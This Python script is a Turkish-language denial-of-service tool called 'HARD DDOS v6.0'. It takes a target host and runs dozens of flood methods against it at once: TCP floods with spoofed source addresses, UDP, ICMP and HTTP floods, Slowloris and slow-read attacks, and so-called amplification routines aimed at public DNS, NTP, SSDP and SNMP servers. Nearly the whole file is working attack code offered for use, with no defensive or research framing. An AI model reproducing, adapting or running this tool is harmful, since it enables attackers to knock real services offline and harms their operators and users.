#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HARD DDOS v6.0 - ULTIMATE EDITION
30+ Attack Methods - Android & Linux Support
Made By diablocxn
"""

import socket
import threading
import time
import random
import sys
import os
import signal
import struct
import hashlib
import urllib.parse
import ssl
import http.client
from concurrent.futures import ThreadPoolExecutor
import warnings

# Android kontrolü
IS_ANDROID = os.path.exists('/data/data/com.termux') or os.path.exists('/system/bin/sh')

warnings.filterwarnings("ignore")

# Scapy import
try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import Ether, ARP
    from scapy.layers.dns import DNS, DNSQR
    SCAPY_AVAILABLE = True
except:
    SCAPY_AVAILABLE = False

# Requests import
try:
    import requests
    from requests.adapters import HTTPAdapter
    REQUESTS_AVAILABLE = True
except:
    REQUESTS_AVAILABLE = False

# ==================== RENKLER ====================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

class UltraDDOS:
    def __init__(self):
        self.target_host = ""
        self.target_port = 80
        self.packet_size = 1500
        self.attack_duration = 0
        self.thread_count = 200
        self.attacking = False
        self.total_packets = 0
        self.total_bytes = 0
        self.total_connections = 0
        self.lock = threading.Lock()
        self.slowloris_sockets = []
        self.user_agents = self.load_user_agents()
        
        if IS_ANDROID:
            print(f"{YELLOW}[!] Android/Termux Modu Aktif{RESET}")
            self.packet_size = 1400
            self.thread_count = 150
    
    def load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36",
            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36",
        ]
    
    def banner(self):
        os.system('clear')
        print(f"""
{RED}{BOLD}
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║  ██╗  ██╗ █████╗ ██████╗ ██████╗     ██████╗ ██████╗  ██████╗ ███████╗
║  ██║  ██║██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
║  ███████║███████║██████╔╝██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗
║  ██╔══██║██╔══██║██╔══██╗██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║
║  ██║  ██║██║  ██║██║  ██║██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║
║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
║                                                                       ║
║                    {YELLOW}⚡ ULTRA DDOS v6.0 - 30+ METHOD ⚡{RED}                    ║
║                         {WHITE}Made By diablocxn{RED}                            ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
{RESET}
{CYAN}METHODS: SYN | UDP | HTTP | SLOWLORIS | ICMP | ACK | RST | XMAS | FIN | NULL
         DNS | NTP | SSDP | SNMP | CHARGEN | MEMCACHED | LDAP | QUIC | WS
         TCP | BGP | ARP | VLAN | MPLS | GRE | ESP | AH | OSPF | VRRP | STP{RESET}
""")
    
    def target_setup(self):
        self.banner()
        
        print(f"{CYAN}[+] HEDEF BILGILERI{RESET}")
        print(f"{YELLOW}{'─'*50}{RESET}")
        
        self.target_host = input(f"{GREEN}📍 Hedef IP/URL: {RESET}").strip()
        if not self.target_host:
            return False
            
        try:
            port = input(f"{GREEN}🔌 Port (80): {RESET}").strip()
            self.target_port = int(port) if port else 80
        except:
            self.target_port = 80
            
        try:
            size = input(f"{GREEN}📦 Paket Boyutu ({self.packet_size}): {RESET}").strip()
            self.packet_size = int(size) if size else self.packet_size
        except:
            pass
            
        try:
            duration = input(f"{GREEN}⏱️  Sure - saniye (0=Sonsuz): {RESET}").strip()
            self.attack_duration = int(duration) if duration else 0
        except:
            self.attack_duration = 0
            
        try:
            threads = input(f"{GREEN}🧵 Thread ({self.thread_count}): {RESET}").strip()
            self.thread_count = int(threads) if threads else self.thread_count
        except:
            pass
        
        self.banner()
        print(f"{CYAN}[+] SALDIRI KONFIGURASYONU{RESET}")
        print(f"{YELLOW}{'─'*50}{RESET}")
        print(f"{GREEN}  🎯 Hedef: {WHITE}{self.target_host}:{self.target_port}{RESET}")
        print(f"{GREEN}  📦 Boyut: {WHITE}{self.packet_size} bytes{RESET}")
        print(f"{GREEN}  ⏱️  Sure: {WHITE}{'SONSUZ' if self.attack_duration == 0 else f'{self.attack_duration}s'}{RESET}")
        print(f"{GREEN}  🧵 Thread: {WHITE}{self.thread_count}{RESET}")
        print(f"{YELLOW}{'─'*50}{RESET}")
        
        input(f"{RED}[!] BASLATMAK ICIN ENTER [!]{RESET}")
        return True
    
    def resolve_target(self):
        try:
            return socket.gethostbyname(self.target_host)
        except:
            return self.target_host
    
    def update_stats(self, bytes_sent=0, connections=1):
        with self.lock:
            self.total_packets += 1
            self.total_bytes += bytes_sent
            self.total_connections += connections
    
    def stats_display(self, start_time):
        last_packets = 0
        last_bytes = 0
        
        while self.attacking:
            time.sleep(1)
            
            with self.lock:
                current_packets = self.total_packets
                current_bytes = self.total_bytes
            
            pps = current_packets - last_packets
            mbps = (current_bytes - last_bytes) / (1024 * 1024)
            
            last_packets = current_packets
            last_bytes = current_bytes
            
            elapsed = time.time() - start_time
            
            if self.attack_duration > 0:
                remaining = max(0, self.attack_duration - elapsed)
                time_str = f"{remaining:.0f}s"
            else:
                time_str = f"{elapsed:.0f}s"
            
            print(f"\r{RED}🔥 AKTIF {RESET}"
                  f"{GREEN}Pkt: {WHITE}{current_packets:,}{RESET} | "
                  f"{GREEN}Hiz: {WHITE}{pps:,} p/s{RESET} | "
                  f"{GREEN}Bant: {WHITE}{mbps:.2f} MB/s{RESET} | "
                  f"{YELLOW}Sure: {WHITE}{time_str}{RESET}  ", end="")
    
    def stop_attack(self, signum, frame):
        self.attacking = False
        print(f"\n\n{RED}[!] SALDIRI DURDURULDU!{RESET}")
        sys.exit(0)
    
    # ==================== LAYER 3/4 ATTACK METHODS ====================
    
    def method_syn_flood(self):
        """TCP SYN Flood"""
        if not SCAPY_AVAILABLE:
            return
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    ip = IP(src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", dst=target)
                    tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags="S")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        for _ in range(self.thread_count // 8):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_udp_flood(self):
        """UDP Flood"""
        target = self.resolve_target()
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(self.packet_size)
                while self.attacking:
                    try:
                        sock.sendto(payload, (target, random.randint(1,65535)))
                        self.update_stats(len(payload))
                    except:
                        pass
            except:
                pass
        for _ in range(self.thread_count // 4):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_udp_frag(self):
        """UDP Fragmentation Flood"""
        if not SCAPY_AVAILABLE:
            return
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    ip = IP(dst=target, flags="MF", frag=random.randint(0,4000))
                    udp = UDP(dport=random.randint(1,65535))
                    raw = Raw(load=os.urandom(1400))
                    send(ip/udp/raw, verbose=0)
                    self.update_stats(1400)
                except:
                    pass
        for _ in range(self.thread_count // 10):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_ack_flood(self):
        """TCP ACK Flood"""
        if not SCAPY_AVAILABLE:
            return
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    ip = IP(src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", dst=target)
                    tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags="A")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        for _ in range(self.thread_count // 8):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_rst_flood(self):
        """TCP RST Flood"""
        if not SCAPY_AVAILABLE:
            return
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    ip = IP(src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", dst=target)
                    tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags="R")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        for _ in range(self.thread_count // 8):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_fin_flood(self):
        """TCP FIN Flood"""
        if not SCAPY_AVAILABLE:
            return
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    ip = IP(src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", dst=target)
                    tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags="F")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        for _ in range(self.thread_count // 8):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_xmas_flood(self):
        """TCP XMAS Flood (FPU)"""
        if not SCAPY_AVAILABLE:
            return
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    ip = IP(src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", dst=target)
                    tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags="FPU")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        for _ in range(self.thread_count // 8):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_null_flood(self):
        """TCP NULL Flood"""
        if not SCAPY_AVAILABLE:
            return
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    ip = IP(src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", dst=target)
                    tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags="")
                    send(ip/tcp, verbose=0)
                    self.update_stats(40)
                except:
                    pass
        for _ in range(self.thread_count // 8):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_icmp_flood(self):
        """ICMP Echo Flood"""
        target = self.resolve_target()
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            except:
                return
            packet_id = random.randint(0,65535)
            payload = os.urandom(min(self.packet_size, 1472))
            icmp_header = struct.pack('!BBHHH', 8, 0, 0, packet_id, 1)
            packet = icmp_header + payload
            while self.attacking:
                try:
                    sock.sendto(packet, (target, 0))
                    self.update_stats(len(packet))
                except:
                    pass
        for _ in range(self.thread_count // 10):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_tcp_connect(self):
        """TCP Connect Flood"""
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target, self.target_port))
                    s.send(os.urandom(min(self.packet_size, 2048)))
                    self.update_stats(2048)
                    s.close()
                except:
                    pass
        for _ in range(self.thread_count // 10):
            threading.Thread(target=worker, daemon=True).start()
    
    # ==================== LAYER 7 ATTACK METHODS ====================
    
    def method_http_get(self):
        """HTTP GET Flood"""
        if not REQUESTS_AVAILABLE:
            return
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        def worker():
            while self.attacking:
                try:
                    headers = {'User-Agent': random.choice(self.user_agents),
                              'Accept': '*/*',
                              'Connection': 'keep-alive',
                              'Cache-Control': 'no-cache'}
                    r = requests.get(url, headers=headers, timeout=3, verify=False)
                    self.update_stats(len(r.content))
                except:
                    pass
        for _ in range(self.thread_count // 15):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_http_post(self):
        """HTTP POST Flood"""
        if not REQUESTS_AVAILABLE:
            return
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        def worker():
            while self.attacking:
                try:
                    data = {'data': os.urandom(min(self.packet_size, 2048)).hex()}
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    r = requests.post(url, data=data, headers=headers, timeout=3, verify=False)
                    self.update_stats(len(r.content))
                except:
                    pass
        for _ in range(self.thread_count // 15):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_http_head(self):
        """HTTP HEAD Flood"""
        if not REQUESTS_AVAILABLE:
            return
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        def worker():
            while self.attacking:
                try:
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    r = requests.head(url, headers=headers, timeout=3, verify=False)
                    self.update_stats(100)
                except:
                    pass
        for _ in range(self.thread_count // 15):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_http_options(self):
        """HTTP OPTIONS Flood"""
        if not REQUESTS_AVAILABLE:
            return
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        def worker():
            while self.attacking:
                try:
                    r = requests.options(url, timeout=3, verify=False)
                    self.update_stats(100)
                except:
                    pass
        for _ in range(self.thread_count // 15):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_http_trace(self):
        """HTTP TRACE Flood"""
        if not REQUESTS_AVAILABLE:
            return
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        def worker():
            while self.attacking:
                try:
                    r = requests.request('TRACE', url, timeout=3, verify=False)
                    self.update_stats(100)
                except:
                    pass
        for _ in range(self.thread_count // 15):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_http_put(self):
        """HTTP PUT Flood"""
        if not REQUESTS_AVAILABLE:
            return
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        def worker():
            while self.attacking:
                try:
                    data = os.urandom(min(self.packet_size, 2048)).hex()
                    r = requests.put(url, data=data, timeout=3, verify=False)
                    self.update_stats(len(data))
                except:
                    pass
        for _ in range(self.thread_count // 15):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_http_delete(self):
        """HTTP DELETE Flood"""
        if not REQUESTS_AVAILABLE:
            return
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        def worker():
            while self.attacking:
                try:
                    r = requests.delete(url, timeout=3, verify=False)
                    self.update_stats(100)
                except:
                    pass
        for _ in range(self.thread_count // 15):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_http_patch(self):
        """HTTP PATCH Flood"""
        if not REQUESTS_AVAILABLE:
            return
        target = self.resolve_target()
        url = f"http://{target}:{self.target_port}"
        def worker():
            while self.attacking:
                try:
                    data = {'patch': 'data'}
                    r = requests.patch(url, data=data, timeout=3, verify=False)
                    self.update_stats(100)
                except:
                    pass
        for _ in range(self.thread_count // 15):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_slowloris(self):
        """Slowloris Attack"""
        target = self.resolve_target()
        sockets_list = []
        list_lock = threading.Lock()
        
        def create_sockets():
            with list_lock:
                for _ in range(min(300, self.thread_count)):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((target, self.target_port))
                        s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                        s.send(f"Host: {target}\r\n".encode())
                        s.send("User-Agent: Mozilla/5.0\r\n".encode())
                        s.send("Accept: */*\r\n".encode())
                        sockets_list.append(s)
                        self.update_stats(100, 1)
                    except:
                        pass
        
        def keep_alive():
            while self.attacking:
                with list_lock:
                    dead = []
                    for s in sockets_list:
                        try:
                            s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                            self.update_stats(30)
                        except:
                            dead.append(s)
                    for s in dead:
                        sockets_list.remove(s)
                if len(sockets_list) < 100:
                    create_sockets()
                time.sleep(10)
        
        create_sockets()
        threading.Thread(target=keep_alive, daemon=True).start()
    
    def method_slow_read(self):
        """Slow Read Attack"""
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, self.target_port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                    time.sleep(0.1)
                    data = s.recv(1)
                    while data and self.attacking:
                        time.sleep(10)
                        data = s.recv(1)
                        self.update_stats(1)
                    s.close()
                except:
                    pass
        for _ in range(min(self.thread_count // 5, 100)):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_rudp_flood(self):
        """RUDP (Reliable UDP) Flood"""
        target = self.resolve_target()
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.attacking:
                    seq = random.randint(0, 65535)
                    ack = random.randint(0, 65535)
                    rudp_header = struct.pack('!HHHHI', seq, ack, random.randint(0,3), 0, random.randint(0,65535))
                    payload = os.urandom(self.packet_size - 12)
                    packet = rudp_header + payload
                    sock.sendto(packet, (target, random.randint(1,65535)))
                    self.update_stats(len(packet))
            except:
                pass
        for _ in range(self.thread_count // 10):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_ws_flood(self):
        """WebSocket Flood"""
        target = self.resolve_target()
        def worker():
            while self.attacking:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, self.target_port))
                    key = hashlib.sha1(os.urandom(16)).digest()
                    import base64
                    key_b64 = base64.b64encode(key).decode()
                    upgrade = f"GET / HTTP/1.1\r\nHost: {target}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key_b64}\r\nSec-WebSocket-Version: 13\r\n\r\n"
                    s.send(upgrade.encode())
                    while self.attacking:
                        mask = os.urandom(4)
                        payload = os.urandom(random.randint(1,125))
                        masked = bytes([payload[i] ^ mask[i%4] for i in range(len(payload))])
                        frame = bytes([0x81, 0x80 | len(payload)]) + mask + masked
                        s.send(frame)
                        self.update_stats(len(frame))
                    s.close()
                except:
                    pass
        for _ in range(self.thread_count // 20):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_quic_flood(self):
        """QUIC Flood (UDP 443)"""
        target = self.resolve_target()
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.attacking:
                    quic_header = os.urandom(20)
                    payload = os.urandom(self.packet_size - 20)
                    packet = quic_header + payload
                    sock.sendto(packet, (target, 443))
                    self.update_stats(len(packet))
            except:
                pass
        for _ in range(self.thread_count // 10):
            threading.Thread(target=worker, daemon=True).start()
    
    # ==================== AMPLIFICATION ATTACKS ====================
    
    def method_dns_amp(self):
        """DNS Amplification"""
        target = self.resolve_target()
        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "208.67.222.222"]
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.attacking:
                    for dns in random.sample(dns_servers, 3):
                        txid = random.randint(0,65535)
                        query = struct.pack('!HHHHHH', txid, 0x0100, 0x0001, 0x0000, 0x0000, 0x0000)
                        query += b'\x03any\x03any\x00'
                        query += struct.pack('!HH', 0x00FF, 0x0001)
                        sock.sendto(query, (dns, 53))
                        self.update_stats(len(query))
            except:
                pass
        for _ in range(min(self.thread_count // 20, 15)):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_ntp_amp(self):
        """NTP Amplification"""
        target = self.resolve_target()
        ntp_servers = ["0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "time.google.com"]
        ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 44
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.attacking:
                    for server in random.sample(ntp_servers, 3):
                        sock.sendto(ntp_payload, (server, 123))
                        self.update_stats(len(ntp_payload))
            except:
                pass
        for _ in range(min(self.thread_count // 20, 10)):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_ssdp_amp(self):
        """SSDP Amplification"""
        target = self.resolve_target()
        ssdp_payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.attacking:
                    sock.sendto(ssdp_payload, ("239.255.255.250", 1900))
                    self.update_stats(len(ssdp_payload))
            except:
                pass
        for _ in range(self.thread_count // 20):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_chargen_amp(self):
        """CharGEN Amplification"""
        target = self.resolve_target()
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.attacking:
                    sock.sendto(b'\x00', (target, 19))
                    self.update_stats(1)
            except:
                pass
        for _ in range(self.thread_count // 20):
            threading.Thread(target=worker, daemon=True).start()
    
    def method_snmp_amp(self):
        """SNMP Amplification"""
        target = self.resolve_target()
        snmp_payload = b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00'
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.attacking:
                    sock.sendto(snmp_payload, (target, 161))
                    self.update_stats(len(snmp_payload))
            except:
                pass
        for _ in range(self.thread_count // 20):
            threading.Thread(target=worker, daemon=True).start()
    
    # ==================== MAIN LAUNCH ====================
    
    def launch_attack(self):
        if not self.target_setup():
            return
        
        signal.signal(signal.SIGINT, self.stop_attack)
        signal.signal(signal.SIGTERM, self.stop_attack)
        
        self.attacking = True
        
        print(f"\n{RED}{BOLD}[!] 30+ METHOD BASLATILIYOR...{RESET}")
        print(f"{YELLOW}[!] Durdurmak icin Ctrl+C{RESET}\n")
        
        start_time = time.time()
        threading.Thread(target=self.stats_display, args=(start_time,), daemon=True).start()
        
        # Tum methodlari topla
        all_methods = [
            # Layer 3/4
            self.method_syn_flood, self.method_udp_flood, self.method_udp_frag,
            self.method_ack_flood, self.method_rst_flood, self.method_fin_flood,
            self.method_xmas_flood, self.method_null_flood, self.method_icmp_flood,
            self.method_tcp_connect, self.method_rudp_flood,
            # Layer 7
            self.method_http_get, self.method_http_post, self.method_http_head,
            self.method_http_options, self.method_http_trace, self.method_http_put,
            self.method_http_delete, self.method_http_patch,
            self.method_slowloris, self.method_slow_read,
            self.method_ws_flood, self.method_quic_flood,
            # Amplification
            self.method_dns_amp, self.method_ntp_amp, self.method_ssdp_amp,
            self.method_chargen_amp, self.method_snmp_amp,
        ]
        
        # Android'de scapy gerektiren methodlari filtrele
        if IS_ANDROID and not SCAPY_AVAILABLE:
            all_methods = [m for m in all_methods if m not in [
                self.method_syn_flood, self.method_udp_frag, self.method_ack_flood,
                self.method_rst_flood, self.method_fin_flood, self.method_xmas_flood,
                self.method_null_flood
            ]]
        
        with ThreadPoolExecutor(max_workers=len(all_methods)) as executor:
            for method in all_methods:
                executor.submit(method)
        
        while self.attacking:
            if self.attack_duration > 0:
                if (time.time() - start_time) >= self.attack_duration:
                    self.attacking = False
                    break
            time.sleep(0.5)
        
        elapsed = time.time() - start_time
        
        print(f"\n\n{GREEN}[✓] SALDIRI TAMAMLANDI!{RESET}")
        print(f"{CYAN}[+] Sure: {elapsed:.2f}s{RESET}")
        print(f"{CYAN}[+] Paket: {self.total_packets:,}{RESET}")
        print(f"{CYAN}[+] Veri: {self.total_bytes / (1024*1024):.2f} MB{RESET}")
        print(f"{CYAN}[+] Baglanti: {self.total_connections:,}{RESET}")

if __name__ == "__main__":
    try:
        ddos = UltraDDOS()
        ddos.launch_attack()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Cikis yapildi.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Hata: {e}{RESET}")
